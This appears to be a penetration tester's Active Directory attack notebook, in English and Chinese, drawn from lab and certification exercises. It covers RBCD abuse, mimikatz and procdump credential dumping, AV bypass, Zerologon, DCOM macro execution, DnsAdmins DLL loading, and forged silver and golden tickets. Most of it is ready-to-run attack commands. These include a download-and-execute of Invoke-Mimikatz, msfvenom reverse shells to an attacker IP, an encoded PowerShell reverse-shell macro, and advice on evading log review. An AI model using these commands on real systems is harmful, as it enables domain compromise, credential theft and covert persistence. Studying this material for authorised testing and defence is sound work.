Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'  

# another way to exploit computer account, powershell; from ired.team/kerberos unconstrained delegation
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
```

### RBCD
+ Resource-Based Constrained Delegation, similar to the basic constrained delegation, diffenrence: rbcd sets in the domain object(eg.coomputer) who is able to impersonate any user against to it. basic constrained delegation need the dc(domain adminis or other privileged user) to configure to a domain user(computer account or user account with spn)
  > constrained object have an attribute called `msds-AllowedToActOnBehalfOfOtherIdentity` with a name of a user that can impersonate any other user against it.
  > any user have write permissions(GenericAll/GenericWrite/WriteProperty/WriteDacl) over a machine account can set the `msDS-AllowedToActOnBehalfOfOtherIdentity`
  > 即，约束委派需要DC进行配置（有权限的用户，比如domain admins）；基于资源的约束委派不需要DC参与可完成配置，只有某个domain用户对某个computer有写权限即可（攻击的关键点），配置`msds-AllowedToActOnBehalfOfOtherIdentity`后和约束委派没区别；
+ new concept from hacktricks
  > TrustedToAuthForDelegation flag inside the userAccountControl value of the user is needed to perform a S4U2Self, but that's not completely truth
  > even without that value, you can perform a S4U2Self against any user if you are a service (have a SPN) , silver ticket?
  > with the TrustedToAuthForDelegation flag, returned TGS will be Forwardable
  > if  the TGS used in S4U2Proxy is NOT Forwardable trying to abuse a basic Constrain Delegation it won't work. But if you are trying to exploit a Resource-Based constrain delegation, it will work (this is not a vulnerability, it's a feature, apparently).
+ attack structure
  > 1. attacker compromised an account(eg. user1) which has a SPN or create one(Service A). Note that any Admin User without any other special privilege can create up until 10 Computer objects (MachineAccountQuota) and set them a SPN. So the attacker can just create a Computer object and set a SPN.
  > 2. attacker abuse user1's WRITE privilege over the victim computer(computer1,service B), configure resourced-based constrained delegation to allow Service A to impersonate any user against Service B(computer1)
  > 3. The attacker(user1) uses Rubeus to perform a full S4U attack (S4U2Self and S4U2Proxy) from Service A to Service B for a user(usally domain admins) with privileged access to Service B. Same to constrained delegation.
  > 4. pass-the-ticket and impersonate the user(eg. domain admins) to gain access to the victim (computer1 Service B)
+ [hacktricks rbcd](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation), contains kerberos error, abuse different service tickets;
+ client1 or client1.offensive.local失败的问题, 区别在于/msdsspn指定的spn使用client1 or client1.offensive.local.[参考1](https://xz.aliyun.com/t/8690#toc-77), [参考2](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
+ Sensitive account cannot be delegated, 考虑其他账号（backup等）或修改tgs， [参考1](https://xz.aliyun.com/t/7454#toc-1), [参考2](https://xz.aliyun.com/t/9382#toc-18) 
+ possible to privesc or dcsync.
+ pg lab demp, resourced; user L.livingstone GenericAll to resourcedc.resourced.local(computer)

```bash
# before and enum
## check MachineAccountQuota, default 10; add domain computer object, ms-ds-machineaccountquota
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
Get-DomainObject -Identity "dc=offensive,dc=local" -Domain offensive.local

## check if user have write priv to some domain computer
## get user sid
get-domainuser -identity rbcdtest -properties objectsid
Get-DomainObjectAcl -Identity client1 | ?{$_.SecurityIdentifier -match "S-1-5-21-1187620287-4058297830-2395299116-3101"}

## check domain controller version, at least 2012; powerview
get-domaincontroller | select OSVersion

# exploit 
## 1. create computer object with powermad
## add computer object
import-module powermad.ps1
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
## check computer sid if the computer added.
get-domaincomputer SERVICEA
S-1-5-21-1187620287-4058297830-2395299116-3102

## 2. configuring rbcd, powerview
$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer computer1 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

## 2. use activedirectory PowerShell module
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked

## 3. S4U attack
## get hash of ServiceA account, 32ED87BDB5FDC5E9CBA88547376818D4
.\Rubeus.exe hash /password:123456 /user:SERVICEA /domain:offensive.local

## impersonate administrator to serviceB(eg. cifs in the cmd) on computer1
rubeus.exe s4u /user:SERVICEA$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/computer1.domain.local /domain:domain.local /ptt

## use /altservice to get more tickets;
## need cifs and host to use psexec.exe gain the shell.
rubeus.exe s4u /user:SERVICEA$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/computer1.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt

## succeded on offensive-ad lab; dir \\client1\c$, access ok
.\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:http/client1 /altservice:krbtgt,host,cifs,winrm /domain:offensive.local [/ptt]

## psexec to gain shell of computer1
psexec.exe -accepteula \\computer1 cmd.exe /c "c:\tools\mp4444.exe"

## failed on offensive-ad lab
## dir \\client1\c$, access denied. dir \\client1.offensive.local\c$, access denied. 
.\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/client1.offensive.local /ptt

## failed on offensive-ad lab
## dir \\client1\c$, access denied. dir \\client1.offensive.local\c$, access denied. 
.\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/client1.offensive.local /altservice:krbtgt,host,http,winrm /domain:offensive.local /ptt

# exploit via impacket-tools
## create machine account/computer object
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'

## check on target if the account added
get-adcomputer attack 

## Set/Configuring Resource-based Constrained Delegation
## impacket-tool rbcd.py need to verify; use: https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

## verify msds-allowedtoactonbehalfofotheridentity on target.
Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

## impersonate administrator, and get st.
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181

## rce to target via pkexec; add hosts first.
export KRB5CCNAME=./Administrator.ccache
sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" >> /etc/hosts' 
echo "192.168.120.181 resourcedc.resourced.local" | sudo tee -a /etc/hosts

impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181
```


### dump creds
+ dump all the hashes in memory and locally if compromise some local admin account(using AsRepRoast, Password Spraying, Kerberoast, Responder including relaying, local privesc).
+ dump creds with mimikatz
+ bypass av
+ dump hash from lsass sam registry
+ dump hash on dc, dcsync/NTDS.DIT; [dump域内用户hash](https://xz.aliyun.com/t/2527)
+ read more [credential access & dumping](https://www.ired.team/offensive-security/credential-access-and-credential-dumping)
+ hacktricks [stealing-credentials](https://book.hacktricks.xyz/windows-hardening/stealing-credentials)
+ pentestlab [dump domain password hash](https://pentestlab.blog/tag/diskshadow/)


#### mimikatz
+ local admin privilege. [mimikatz](https://github.com/gentilkiwi/mimikatz/releases),需考虑免杀
+ [mimikatz docs](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
+ [hacktricks mimikatz credentials](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)
+ load mimikatz to powershell, avoid executing exe as a standalone app;[powershellmafia git](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
+ more about credentials protection. hacktricks [mimikatz - credentials](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

```bash
# help, check the module and command
lsadump::

# Elevate Privileges to extract the credentials
## This should give am error if you are Admin, but if it does, check if the SeDebugPrivilege was removed from Admins
privilege::debug 
## grant to the highest level access
token::elevate

# One liner
mimikatz "log ms01-mimikatz.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"

## on-liner commond
mimikatz.exe "privilege::debug" "log logonpwd.log" "sekurlsa::logonpasswords full" exit

## engage SeDebugPrivlege
mimikatz # privilege::debug

# sekurlsa, extracts passwords, keys, pin codes, tickets from the memory of lsass (Local Security Authority Subsystem Service)
## logonpassords, Extract from lsass (memory)
sekurlsa::logonpasswords  

## get kerveros keys
sekurlsa::ekeys

## retrieves the kerberos tickets stored in the machine 
sekurlsa::tickets
sekurlsa::tickets /export

# lsadump module, Commands: sam, secrets, cache, lsa, trust, backupkeys, rpdata, dcsync, netsync
## get the lsa secrets，clear-text password, stored in registry HKLM\security\policy\secrets
## https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets
token::elevate
lsadump::secrets
lsadump::secrets /system:c:\temp\system /security:c:\temp\security

## retrieve the cached domain logons
## not able to pth; but could to try crack, hashcat 2100
lsadump::cache

## fetch the local account credentials, from sam entries(registry or hive)
## get the SysKey to decrypt sam entries; Extract from SAM
lsadump::sam

## dump hash, will get the krbtgt hash on dc; Extract from lsass (service)
## /patch, patch lsass
## /inject, inject lsass to extract credentials
## /name, account name for target user
## /id, RID for target user
lsadump::lsa /patch
lsadump::lsa /inject

# kerberos module, used without privilege;
## commands: ptt, golden/silver, list, tgt, purge

## pass the ticket
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

# PowerSploit Invoke-Mimikatz 获取
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'

# msf mimikatz, meterpreter
meterpreter>load mimikatz
meterpreter>mimikatz_command -f mimikatz的指令
privilege::debug #提权  
samdump::hashes #dump哈希  
## 或者
meterpreter>msv/kerberos/widgst

## meterpreter自带hash获取module
meterpreter>hashdump
meterpreter>run windows/gather/smart_hashdump   //(推荐使用这个)
```

#### Bypass AV
+ check hacktricks, [bypass av](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#bypassing-av)
+ dump hash from lsass process(memory), procdump + mimikatz
  > lsass进程负责Windows本地安全和登录策略，所有通过本地、远程身份成功登陆的用户信息都会保存在lsass.exe进程的内存中，其转储文件可用来抓取明文密码和哈希值
  > procdump, windows自带工具可免杀（部分情况）[Systeminternals-suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) [procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)

```bash
# lsass process dump
## need rdp， 任务管理器转储
## taskmgr 打开任务管理器，找到lsass.exe进程，右键-->创建转储文件，保存;生成文件路径样例：
C:\Users\ADMINI~1\AppData\Local\Temp\lsass.DMP

## Procdump 
## Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
## Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Extract creds from the dump.
## //Load the dump
privilege::debug
sekurlsa::minidump lsass.dmp
## Extract credentials
log passdump.log
sekurlsa::logonpasswords [full]

## pypykatz dump
pypykatz lsa minidump ./lsass.DMP > lsadump.log
```

#### SAM and SYSTEM
+ located in C:\windows\system32\config\SAM and C:\windows\system32\config\SYSTEM. cannot just copy them in a regular way because they protected
+ save from registry and copy.
+ copy via Invoke-NinjaCopy
+ volume shadow copy, need administrator; vsadmin only work on windows server.

```bash
# way 1: save registry and copy.
## 获取注册表转储文件，默认存在目标机C:\目录下
## 目标机中文系统会提示解码错误，不影响使用
## /y:强制覆盖已存在文件，避免目标机C:\目录下存在同名文件，命令会询问是否覆盖，半交互模式程序会卡住
reg save HKLM\SYSTEM system.hive /y
reg save HKLM\SAM sam.hive /y
reg save HKLM\SECURITY security.hive /y  ## 非必须

## mimikatz 导出hive
mimikatz.exe "log lsadump.log" "privilege::debug" "lsadump::sam /sam:c:\temp\sam.hive /system:c:\temp\system.hive" "exit"

## dump creds via impacket or samdump2
samdump2 SYSTEM SAM
python3 secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL

# way2: Invoke-NinjaCopy
## make a copy of SAM, SYSTEM and ntds.dit
## https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\system" -LocalDestination "c:\copy_of_local_system"
Invoke-NinjaCopy.ps1 -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "c:\copy_of_local_ntds.dit"

# way3: shadow copy
```

#### AD ntds
> The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
+ located in: %SystemRoom%/NTDS/ntds.dit; [read more on hacktricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#active-directory-credentials-ntds.dit)
  > Windows uses Ntdsa.dll to interact with that file and its used by lsass.exe. Then, part of the NTDS.dit file could be located inside the lsass memory (you can find the latest accessed data probably because of the performance improve by using a cache).
+ Copying NTDS.dit using Ntdsutil, Available since Windows Server 2008.
+ volume shadow copy also works, need system file too.
+ extract creds automatically using a valid domain admin user
+ for big ntds.dit file, extrack with [gosecretsdump](https://github.com/c-sto/gosecretsdump)

```bash
# ntds.dit copy.
## ntdsutil copy
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit

## Nishang 提取Ntds.DIT, SAM, SYSTEM
## https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\

# ndts dump creds.
## impacket
impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL -outputfile dumpcreds

## extract them automatically using a valid domain admin user
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

#### Crackmapexec -- check later
+ crackmapexec dump, ?

```bash
# dump sam hash
## from sam, only local hash.
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam

# dump lsa secrets
## could got cleartext password, from lsass.exe
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

# Dump the NTDS.dit from target DC
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# Dump the NTDS.dit password history from target DC
## --ntds-history, wrong argument
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history

# Show the pwdLastSet attribute for each NTDS.dit account;
## --ntds-pwdLastSet, wrong argument
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

#### Lazagne
+ extract credentials from several software.[binary and pip](https://github.com/AlessandroZ/LaZagne)

```bash
lazagne.exe all
```


**Rebeus harvest**
+ rebeus, harvesting gathers tickets that are transferred to the KDC and saves them for use in other attacks, such as pass the ticket.
+ https://github.com/GhostPack/Rubeus

```bash
## /interval, harvest for TGTs every 30 seconds.
rebeus.exe harvest /interval:30

```

### AD exp

#### Zerologon
+ cve-2020-1472, [github exploit](https://github.com/dirkjanm/CVE-2020-1472)
+ test script, [](https://github.com/SecuraBV/CVE-2020-1472)
+ effected version: 

```bash
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012 
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)

# exploit
python cve-2020-1472-exploit.py multimaster $tip
# dump hash
secretsdump.py -just-dc -no-pass 'multimaster$'@multimaster
```

### DCOM
Distributed Component Object Model
+ COM, Microsoft Component Object Model, system for creating software components that interact with each other. same-process and cross-process interaction
+ DCOM, COM extended to DCOM for interaction between multiple computers over a network.
+ COM, DCOM  very old technologies. DCOM interaction is performed over RPC and TCP port 135; local administrator access is required to call DCOM service Control Manager(API)


```bash
# login student vm via jeff_admin  domain user,  jeff_admin is the local admin on dc 172.16.196.5
## discover available methods or sub-objects for this DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.196.5"))
$com | Get-Member


#-create macro file
## excel, view--macros, save in legacy.xls
Sub mymacro()
    Shell ("notepad.exe")
End Sub


#-copy to remote computer, need local administator  and have access to remote filesystem through smb
$LocalPath = "C:\Users\jeff_admin.corp\legacy.xls"
$RemotePath = "\\172.16.196.5\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

#-create system account profile
## excel.application is instantiated throuth DCOM with  system account,  system account does not have profile, which is used as part of opening process
$Path = "\\172.16.196.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)

#-execute macro
$Workbook = $com.Workbooks.Open("C:\legacy.xls")
$com.Run("mymacro")

#-full code
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.196.5"))
$LocalPath = "C:\Users\jeff_admin\legacy.xls"

$RemotePath = "\\172.16.196.5\c$\legacy.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\172.16.196.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\legacy.xls")

$com.Run("mymacro")

#-reaverse shell, 无法获取shell时，尝试更换端口及paylod(x64)
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.196.10 LPORT=4444 -f hta-psh -o evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.196.10 LPORT=443 -f hta-psh -o evil2.hta
//evil.hta  powershell str is base64 encoded, split and copy to mymacro
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub
```

## ad persistence
+ silver ticket
+ golden ticket

### privilege group
+ high value group, also able to privesc: domain admins, backup operators, 

#### Account operators
+ Allows creating non administrator accounts and groups on the domain
+ Allows logging in to the DC locally

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse

net user test /domain

# add user 
net uer hack1 Password! /add /domain
```

#### Backup operators
+ As with Server Operators membership, we can access the DC01 file system if we belong to Backup Operators. check hacktricks.
+ dump ntds to get the creds, or dll hijack. htb-blackfield.

```bash
# 1 diskshadow the c:\ 
## scripts, don't forget to unix2dos if error.
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit

## unix2dos, and upload
unix2dos diskshadow.txt

## run diskshadow
diskshadow -s disk.txt

# 2 copy ntds, robocopy
cd c:\temp
robocopy /B F:\Windows\NTDS .\ntds ntds.dit

# copy ntds, Copy-FileSeBackupPrivilege; also called local attack.
## https://github.com/giuliano108/SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit c:\temp\ntds.dit

# 3 save system and sam
reg save HKLM\SYSTEM system
reg save HKLM\SAM sam

# 4 dump the creds. sam not necessary.
secretsdump.py -ntds ntds.dit -system system local
```

#### Recycle bin
+ have permission to read deleted AD object. Something juicy information can be found in there(passwod); htb cascade

```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

# query deleted ad object
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

# query deleted ad object, tempadmin
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```

#### Dnsadmins
+ member of the DNSAdmins group or have write privileges to a DNS server object can load an arbitrary DLL with SYSTEM privileges on the DNS server.
+ Execute arbitrary DLL, privesc; make the DNS server load an arbitrary DLL with SYSTEM privileges (DNS service runs as NT AUTHORITY\SYSTEM). can load local or remote file
+ about opsec, check htb resolute ipsec video.

```bash
# check dnsadmin group members 
Get-NetGroupMember -Identity "DnsAdmins" -Recurse

# Execute arbitrary DLL
## not opsec, will hang the dns service.
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll

## msf generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$kip LPORT=443 -f dll -o rev.dll

## execute 
dnscmd  /config /serverlevelplugindll \\10.10.14.90\share\rev.dll
sc.exe \\resolute stop dns
sc.exe \\resolute start dns

```

### Silver ticket
+ if the service tickets belong to the current user, then no administrative privileges are required.
+ The user and group permission in service ticket are not verified by the application.
+ silver ticket: forge service ticket to access the target resource with any permission we desire. need service account password and ntlm hash.
+ need service account ntlm hash or computer account hash; rubeus could convert password to hash
+ [How Attackers user Kerberos Silver ticket to exploit System](https://adsecurity.org/?p=2011), cifs/http+wsman/ldap
+ hacktricks silver ticket https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket
+ hacking articles, silver ticket theory/mimikatz/rubeus/mitigation, [Domain Persistence: Silver Ticket Attack](https://www.hackingarticles.in/domain-persistence-silver-ticket-attack/)

```bash
# 获取domain sid
c:\>whoami /user
corp\offsec S-1-5-21-4038953314-3014849035-1274281563-1103
sid:S-1-5-21-4038953314-3014849035-1274281563

## Domain Users SID: S-1-5-21<DOMAINID>-513
## Domain Admins SID: S-1-5-21<DOMAINID>-512
## Schema Admins SID: S-1-5-21<DOMAINID>-518
## Enterprise Admins SID: S-1-5-21<DOMAINID>-519
## Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520

# flush any existing Kerberos tickets 
kerveros：purge
kerberos：list

# create silver ticket, mimikatz kerberos module
## user, username
## domain, domain name
## sid, domain sid
## target, full qualified host name of the service
## service, service type, HTTP
## rc4, pwd hash of iis service account
## /ptt, pass the ticket to memory, remove ptt to save the ticket in file.

# http service 
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

# mssql silver ticket
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

## sqlcmd connect to mssql service with admin privilege
sqlcmd -s server
```

**cifs sivler ticket**
+ 伪造票据后，添加domain admin user
+ need computer account ntlm hash
+ able to access the c$ share, also able to psexec; https://www.jianshu.com/p/4936da524040

```bash
kerberos::golden /domain:cyberpeace.com /sid:S-1-5-21-2718660907-658632824-2072795563 /target:scene.cyberpeace.com /service:cifs /rc4:9a68826fdc2811f20d1f73a471ad7b9a /user:test /ptt

dir \\computername\c$

## impacket ticketer
ticketer.py -nthash 2fd4ca856c21e68b867a41314cda8ca3 -domain-sid S-1-5-21-432953485-3795405108-1502158860 -domain controller.local -spn cifs/controller-1.controller.local fakehello 

## psexec
export KRB5CCNAME=fakehello.ccache
psexec.py controller.local/fakehello@controller-1.controller.local -k -no-pass 
```

### GoldenTickets
+ A valid **TGT as any user** can be created using the **NTLM hash of the krbtgt AD account**. 
+ The advantage of forging a TGT instead of TGS is being **able to access any service (or machine)** in the domain and the impersonated user.
+ when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain.
+ This secret key is actually the password hash of a domain user account called krbtgt.
+ krbtgt account NTLM hash obtained: lsass process, ntds.dit file of DC, DCsync attack

**golden ticket advantage**
* krbtgt account password is not automatically changed. Only changed when the domain functional level is upgraded from windows 2003 to windows 2008.
* Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain
* Client向TGS发送KRB_TGS_REQ之后的工作不再验证用户账户的有效性，所以利用黄金票据可以模拟任何用户访问域中相应资源
* 只要能登陆域中的主机，就可以利用黄金票据，不需要域用户身份登录，重要的是可以解析DC的FQDN

```
# 在没有导入黄金票据的情况下,域内主机执行命令，导入后可访问；?
dir \\dc.main.test.com\c$
Access is denied，

# 未加入域的主机导入票据前后输入命令，无法访问?
dir \\dc.main.test.com\c$
The network path was not found

# 前置条件
## have access to an account, member of Domain Admins group; or compromised the dc
## domain name, domain sid, krbtgt NTLM hash, fake username
##  1-dump hash
## simulate, login dc via rdp using jeff_admin

mimikatz
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668
RID : 000001f4 (500)
User : Administrator
LM :
NTLM : e2b475c11da2a0748290d87aa966c327
RID : 000001f5 (501)
User : Guest
LM :
NTLM :
RID : 000001f6 (502)
User : krbtgt
LM :
NTLM : 75b60230a2394a812000dbfad8415965  //hash


## 从lsass进程获取krbtgt账户哈希
lsadump::lsa /inject /name:krbtgt

## 导出所有
mimikatz: lsadump::dcsync /domain:corp.com /all /csv

## 查看用户 sid，从NTDS.DIT 数据库获取krbtgt hash
lsadump::dcsync /domain:corp.com /user:krbtgt


# 2-create golden tickets
## use non-existent username may alert incident handlers if they reviewing the access logs. 
## Consider useing the name and ID of an existing system administrator.
## Use krbtgt hash, not need administrator privilege, 

## delete existing kerberos tickets
kerberos::purge

## get sid
whomai /user

## sid, 域sid，不含 RID；抓取SID=域SID-RID
## krbtgt,指定password hash
## user, golden ticket's username, fakeuser
## userid 500, default set, RID of the built-in administrator for domain.
## group id, set to most privileged groups in ad, including Domain admins.
## ticket:ticket.kirbi 生成文件
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt

User : fakeuser
Domain : corp.com (CORP)
...
Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session

misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24

## klist, can see the tgt with user fakeuser
dir \\domain-computer\c$ 

# exploit, lateral move
## 1 psexec 获取shell
## use hostname
psexec.exe \\dc01 cmd.exe

## use PsExec to IP address of dc, force use the NTLM authentication and no access
psexec.exe \\192.168.1.110 cmd.exe

## 2 添加domain admin 用户
## 登录普通用户，利用golden ticket
kerberos::purge
kerberos::ptt ticket.kirbi
misc::cmd

## add user 
net user test 123456 /add /domain
net group "domain admins" test /add /domain

# From linux
## create golden ticket
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass

# rubeus exploit
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory
```

1. Why is the password hash for the krbtgt account changed during a functional level upgrade from Windows 2003 to Windows 2008?
https://adsecurity.org/?p=483
 Changing the KRBTGT password is only supported by Microsoft once the domain functional level is Windows Server 2008 or greater. This is likely due to the fact that the KRBTGT password changes as part of the DFL update to 2008 to support Kerberos AES encryption, so it has been tested.

https://community.centrify.com/s/article/Basics-Understanding-how-Active-Directory-Functional-Levels-affect-Centrified-Systems-22077
Raising the DFL to Windows Server 2008 implements AES 128 and AES 256 for Kerberos.
*   Raising the DFL will change the password of the KRBTGT account; this makes older secrets invalid.

